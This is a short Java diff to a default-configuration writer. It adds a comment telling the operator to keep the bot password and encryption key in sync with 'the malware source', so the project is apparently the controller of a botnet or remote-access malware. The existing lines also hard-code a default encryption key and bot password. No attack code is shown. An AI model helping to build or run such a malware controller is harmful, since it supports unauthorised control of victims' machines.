@@ -25,6 +25,7 @@ public class DefaultConfigurationFile implements ConfigFile {
                 try(PrintWriter writer = new PrintWriter(new FileWriter(file), true)){
                     writer.println(
                         "# this is the default " + Main.name + " configuration.\n\n" +
+                                "# <!> IF YOU CHANGE THE BOT PASSWORD OR ENCRYPTION KEY MAKE SURE THAT YOU ALSO CHANGE THEM IN THE MALWARE SOURCE! <!> \n" +
                                 "encryption-key=jBotEncryptionKey\n" +
                                 "bot-password=A4r0nAkht4r");
                 }
